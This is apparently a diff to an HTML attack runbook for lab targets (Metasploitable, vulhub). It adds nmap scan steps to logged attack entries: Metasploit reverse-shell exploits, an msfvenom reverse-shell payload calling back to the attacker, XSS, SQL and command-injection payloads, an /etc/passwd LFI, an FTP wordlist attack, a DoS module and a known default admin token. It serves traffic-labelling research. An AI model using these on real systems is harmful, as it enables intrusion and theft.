@@ -151,12 +151,23 @@
         <div class="status-pill ran"><strong>ran</strong> &mdash; executed without error, no exploit (also: scanning)</div>
         <div class="status-pill error"><strong>error</strong> &mdash; tool errored / attack failed</div>
       </div>
+      <div class="attack">
+        <div class="attack-header"><span class="attack-num">#0</span><span class="attack-title">Initial Full Port Scan</span><span class="badge badge-name">nmap-full-portscan</span><span class="badge badge-port">1-65535</span><span class="badge badge-tcp">TCP</span></div>
+        <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name nmap-full-portscan --dst-ip &lt;dst-ip&gt; --dst-port 1-65535
+nmap -p- &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
+        </div>
+      </div>
       <!-- MS2 -->
       <div class="vm-header" id="ms2"><h3>Metasploitable 2</h3><span class="badge badge-tcp">Linux</span></div>
       <p class="vm-note">Note: More attacks will be added before the infrastructure is ready.</p>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#1</span><span class="attack-title">Unix R-Services Reverse Shell</span><span class="badge badge-name">ms2-rservices-revshell</span><span class="badge badge-port">513</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-rservices-portscan --dst-ip &lt;dst-ip&gt; --dst-port 513
+nmap -p 513 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-rservices-revshell --dst-ip &lt;dst-ip&gt; --dst-port 513</pre></div>
           <div class="step-label">Execute</div><div class="code-block"><pre>rlogin -l root &lt;dst-ip&gt;</pre></div>
           <div class="step-label">End</div><div class="code-block"><pre>attacklog end --status &lt;success|ran|error&gt;</pre></div>
@@ -165,6 +176,9 @@
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#2</span><span class="attack-title">UnrealIRCD Backdoor Reverse Shell</span><span class="badge badge-name">ms2-unrealircd-revshell</span><span class="badge badge-port">6667</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-unrealircd-portscan --dst-ip &lt;dst-ip&gt; --dst-port 6667
+nmap -p 6667 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-unrealircd-revshell --dst-ip &lt;dst-ip&gt; --dst-port 6667</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -180,6 +194,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#3</span><span class="attack-title">DVWA XSS Reflected</span><span class="badge badge-name">ms2-dvwa-xss-reflected</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-reflected-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-reflected --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute &mdash; navigate to DVWA XSS (Reflected) page and inject</div>
           <div class="code-block"><div class="code-block-label">Low / Medium</div><pre>&lt;svg onload=alert('Example')&gt;</pre></div>
@@ -190,6 +207,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#4</span><span class="attack-title">DVWA XSS Stored</span><span class="badge badge-name">ms2-dvwa-xss-stored</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-stored-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-xss-stored --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute &mdash; navigate to DVWA XSS (Stored) page</div>
           <div class="code-block"><div class="code-block-label">Low &mdash; inject into message field</div><pre>&lt;script&gt;alert('example')&lt;/script&gt;</pre></div>
@@ -201,6 +221,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#5</span><span class="attack-title">DVWA Command Injection</span><span class="badge badge-name">ms2-dvwa-cmdinject</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-cmdinject-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-cmdinject --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute &mdash; navigate to DVWA Command Execution page</div>
           <div class="code-block"><div class="code-block-label">Low</div><pre>127.0.0.1 &amp;&amp; whoami</pre></div>
@@ -211,6 +234,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#6</span><span class="attack-title">DVWA File Inclusion (LFI)</span><span class="badge badge-name">ms2-dvwa-lfi</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-lfi-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-lfi --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Low</div><pre>http://&lt;dst-ip&gt;/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd</pre></div>
@@ -220,6 +246,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#7</span><span class="attack-title">DVWA SQL Injection (Manual)</span><span class="badge badge-name">ms2-dvwa-sqli-manual</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-sqli-manual-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-dvwa-sqli-manual --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute &mdash; navigate to DVWA SQL Injection page</div>
           <div class="code-block"><div class="code-block-label">Low &mdash; basic bypass</div><pre>1' or 1 = '1</pre></div>
@@ -232,6 +261,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#8</span><span class="attack-title">Mutillidae SQLMap</span><span class="badge badge-name">ms2-mutillidae-sqlmap</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms2-mutillidae-sqlmap-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms2-mutillidae-sqlmap --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute &mdash; pick based on traffic pattern needed</div>
           <div class="code-block"><div class="code-block-label">Basic scan</div><pre>sqlmap -u "http://&lt;dst-ip&gt;/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details" -p username,password --batch</pre></div>
@@ -249,6 +281,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#9</span><span class="attack-title">GlassFish Reverse Shell</span><span class="badge badge-name">ms3-glassfish-revshell</span><span class="badge badge-port">4848</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-glassfish-portscan --dst-ip &lt;dst-ip&gt; --dst-port 4848
+nmap -p 4848 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-glassfish-revshell --dst-ip &lt;dst-ip&gt; --dst-port 4848</pre></div>
           <div class="step-label">Generate payload</div><div class="code-block"><pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f war -o shell.war</pre></div>
           <div class="step-label">Start listener</div>
@@ -266,6 +301,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#10</span><span class="attack-title">Jenkins Reverse Shell</span><span class="badge badge-name">ms3-jenkins-revshell</span><span class="badge badge-port">8484</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-jenkins-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8484
+nmap -p 8484 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-jenkins-revshell --dst-ip &lt;dst-ip&gt; --dst-port 8484</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use exploit/multi/http/jenkins_script_console
@@ -282,6 +320,9 @@ exploit</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#11</span><span class="attack-title">IIS HTTP Denial of Service</span><span class="badge badge-name">ms3-iis-http-dos</span><span class="badge badge-port">80</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2015-1635</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-iis-http-dos-portscan --dst-ip &lt;dst-ip&gt; --dst-port 80
+nmap -p 80 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-iis-http-dos --dst-ip &lt;dst-ip&gt; --dst-port 80</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use auxiliary/dos/http/ms15_034_ulonglongadd
@@ -294,6 +335,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#12</span><span class="attack-title">IIS FTP Wordlist Login Attack</span><span class="badge badge-name">ms3-iis-ftp-wordlist</span><span class="badge badge-port">21</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-iis-ftp-wordlist-portscan --dst-ip &lt;dst-ip&gt; --dst-port 21
+nmap -p 21 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-iis-ftp-wordlist --dst-ip &lt;dst-ip&gt; --dst-port 21</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use auxiliary/scanner/ftp/ftp_login
@@ -309,6 +353,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#13</span><span class="attack-title">ElasticSearch Reverse Shell</span><span class="badge badge-name">ms3-elasticsearch-revshell</span><span class="badge badge-port">9200</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2014-3120</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-elasticsearch-portscan --dst-ip &lt;dst-ip&gt; --dst-port 9200
+nmap -p 9200 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-elasticsearch-revshell --dst-ip &lt;dst-ip&gt; --dst-port 9200</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use exploit/multi/elasticsearch/script_mvel_rce
@@ -324,6 +371,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#14</span><span class="attack-title">SNMP Enumeration</span><span class="badge badge-name">ms3-snmp-enum</span><span class="badge badge-port">161</span><span class="badge badge-udp">UDP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-snmp-portscan --dst-ip &lt;dst-ip&gt; --dst-port 161 --protocol udp
+nmap -sU -p 161 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-snmp-enum --dst-ip &lt;dst-ip&gt; --dst-port 161 --protocol udp</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use auxiliary/scanner/snmp/snmp_enum
@@ -338,6 +388,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#15</span><span class="attack-title">JMX Reverse Shell</span><span class="badge badge-name">ms3-jmx-revshell</span><span class="badge badge-port">1617</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2015-2342</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name ms3-jmx-portscan --dst-ip &lt;dst-ip&gt; --dst-port 1617
+nmap -p 1617 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name ms3-jmx-revshell --dst-ip &lt;dst-ip&gt; --dst-port 1617</pre></div>
           <div class="step-label">Execute</div>
           <div class="code-block"><div class="code-block-label">Metasploit</div><pre>use exploit/multi/misc/java_jmx_server
@@ -360,6 +413,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#16</span><span class="attack-title">Flask (Jinja2) Server-Side Template Injection</span><span class="badge badge-name">vulhub-flask-ssti</span><span class="badge badge-port">8000</span><span class="badge badge-tcp">TCP</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-flask-ssti-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8000
+nmap -p 8000 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-flask-ssti --dst-ip &lt;dst-ip&gt; --dst-port 8000</pre></div>
           <p>Flask/Jinja2 SSTI vulnerability allowing RCE when user input is rendered directly in templates without sanitization.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -384,6 +440,9 @@ run</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#17</span><span class="attack-title">Apache Airflow Command Injection in Example DAG</span><span class="badge badge-name">vulhub-airflow-cve-2020-11978</span><span class="badge badge-port">8080</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2020-11978</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-11978-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8080
+nmap -p 8080 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-11978 --dst-ip &lt;dst-ip&gt; --dst-port 8080</pre></div>
           <p>Command injection in example DAG <code>example_trigger_target_dag</code> in Apache Airflow prior to 1.10.10.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose run airflow-init
@@ -403,6 +462,9 @@ docker compose up -d</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#18</span><span class="attack-title">Apache Airflow Celery Broker Remote Command Execution</span><span class="badge badge-name">vulhub-airflow-cve-2020-11981</span><span class="badge badge-port">6379</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2020-11981</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-11981-portscan --dst-ip &lt;dst-ip&gt; --dst-port 6379
+nmap -p 6379 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-11981 --dst-ip &lt;dst-ip&gt; --dst-port 6379</pre></div>
           <p>If the Redis broker is controlled by an attacker, arbitrary commands can be executed in the worker process. Apache Airflow prior to 1.10.10.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose run airflow-init
@@ -420,6 +482,9 @@ python exploit_airflow_celery.py &lt;dst-ip&gt;</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#19</span><span class="attack-title">1Panel Control Panel PostAuth SQL Injection</span><span class="badge badge-name">vulhub-1panel-cve-2024-39907</span><span class="badge badge-port">10086</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2024-39907</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-1panel-cve-2024-39907-portscan --dst-ip &lt;dst-ip&gt; --dst-port 10086
+nmap -p 10086 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-1panel-cve-2024-39907 --dst-ip &lt;dst-ip&gt; --dst-port 10086</pre></div>
           <p>SQL injection in the 1Panel control panel (v1.10.9-lts and earlier) allows arbitrary file writes and RCE. Patched in v1.10.12-lts.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -442,6 +507,9 @@ Content-Type: application/json
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#20</span><span class="attack-title">Apache ActiveMQ Jolokia Authenticated RCE</span><span class="badge badge-name">vulhub-activemq-cve-2022-41678</span><span class="badge badge-port">8161</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2022-41678</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-activemq-cve-2022-41678-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8161
+nmap -p 8161 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-activemq-cve-2022-41678 --dst-ip &lt;dst-ip&gt; --dst-port 8161</pre></div>
           <p>Authenticated RCE in Apache ActiveMQ prior to 5.16.5 and 5.17.3 via the Jolokia <code>/api/jolokia</code> endpoint.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -474,6 +542,9 @@ Origin: http://localhost</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#21</span><span class="attack-title">Apache ActiveMQ Jolokia Remote Code Execution</span><span class="badge badge-name">vulhub-activemq-cve-2026-34197</span><span class="badge badge-port">8161</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2026-34197</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-activemq-cve-2026-34197-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8161
+nmap -p 8161 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-activemq-cve-2026-34197 --dst-ip &lt;dst-ip&gt; --dst-port 8161</pre></div>
           <p>Authenticated RCE in Apache ActiveMQ before 5.19.4 and 6.0.0 before 6.2.3. The Jolokia JMX-HTTP bridge exposes <code>addNetworkConnector(String)</code>, allowing an attacker to load a remote Spring XML config and achieve code execution.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -511,6 +582,9 @@ Authorization: Basic YWRtaW46YWRtaW4=
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#22</span><span class="attack-title">Apache Airflow Authentication Bypass</span><span class="badge badge-name">vulhub-airflow-cve-2020-17526</span><span class="badge badge-port">8080</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2020-17526</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-17526-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8080
+nmap -p 8080 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-airflow-cve-2020-17526 --dst-ip &lt;dst-ip&gt; --dst-port 8080</pre></div>
           <p>Default session secret key in Apache Airflow prior to 1.10.13 allows forging session cookies and impersonating arbitrary users.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose run airflow-init
@@ -536,6 +610,9 @@ docker compose up -d</pre></div>
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#23</span><span class="attack-title">AJ-Report Authentication Bypass and RCE</span><span class="badge badge-name">vulhub-aj-report-cnvd-2024-15077</span><span class="badge badge-port">9095</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CNVD-2024-15077</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-aj-report-cnvd-2024-15077-portscan --dst-ip &lt;dst-ip&gt; --dst-port 9095
+nmap -p 9095 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-aj-report-cnvd-2024-15077 --dst-ip &lt;dst-ip&gt; --dst-port 9095</pre></div>
           <p>AJ-Report v1.4.0 and earlier contains an authentication bypass allowing arbitrary code execution.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -552,6 +629,9 @@ Content-Type: application/json;charset=UTF-8
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#24</span><span class="attack-title">Apache CXF Aegis DataBinding SSRF</span><span class="badge badge-name">vulhub-apache-cxf-cve-2024-28752</span><span class="badge badge-port">8080</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2024-28752</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-apache-cxf-cve-2024-28752-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8080
+nmap -p 8080 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-apache-cxf-cve-2024-28752 --dst-ip &lt;dst-ip&gt; --dst-port 8080</pre></div>
           <p>SSRF in Apache CXF before 4.0.4, 3.6.3, and 3.5.8 using Aegis DataBinding. Vulnerable endpoint: <code>http://&lt;dst-ip&gt;:8080/test?wsdl</code>.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -586,6 +666,9 @@ Content-Disposition: form-data; name="1"
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#25</span><span class="attack-title">Apache Druid Embedded JavaScript RCE</span><span class="badge badge-name">vulhub-apache-druid-cve-2021-25646</span><span class="badge badge-port">8888</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2021-25646</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-apache-druid-cve-2021-25646-portscan --dst-ip &lt;dst-ip&gt; --dst-port 8888
+nmap -p 8888 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-apache-druid-cve-2021-25646 --dst-ip &lt;dst-ip&gt; --dst-port 8888</pre></div>
           <p>Apache Druid 0.20.0 and earlier allows authenticated users to execute arbitrary JavaScript code, leading to RCE with the privileges of the Druid server process.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
@@ -614,6 +697,9 @@ Content-Type: application/json
       <div class="attack">
         <div class="attack-header"><span class="attack-num">#26</span><span class="attack-title">Apache APISIX Hardcoded API Token RCE</span><span class="badge badge-name">vulhub-apisix-cve-2020-13945</span><span class="badge badge-port">9080</span><span class="badge badge-tcp">TCP</span><span class="badge badge-cve">CVE-2020-13945</span></div>
         <div class="attack-body">
+          <div class="step-label">Port Scan</div><div class="code-block"><pre>attacklog start --name vulhub-apisix-cve-2020-13945-portscan --dst-ip &lt;dst-ip&gt; --dst-port 9080
+nmap -p 9080 &lt;dst-ip&gt;
+attacklog end --status ran</pre></div>
           <div class="step-label">Start</div><div class="code-block"><pre>attacklog start --name vulhub-apisix-cve-2020-13945 --dst-ip &lt;dst-ip&gt; --dst-port 9080</pre></div>
           <p>Apache APISIX has a default built-in API token <code>edd1c9f034335f136f87ad84b625c8f1</code> giving access to all admin APIs, allowing remote Lua code execution via the <code>script</code> parameter in version 2.x.</p>
           <div class="step-label">Environment Setup</div><div class="code-block"><pre>docker compose up -d</pre></div>
